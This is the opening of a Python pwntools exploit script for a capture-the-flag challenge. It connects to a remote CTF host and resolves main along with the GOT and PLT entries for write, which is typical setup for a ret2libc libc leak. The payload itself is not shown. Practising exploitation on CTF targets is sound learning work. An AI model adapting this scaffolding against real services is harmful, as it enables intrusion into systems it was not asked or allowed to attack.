from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28198)
elf = ELF('./pwn')
main = elf.sym['main']
write_got = elf.got['write']
write_plt = elf.plt['write']
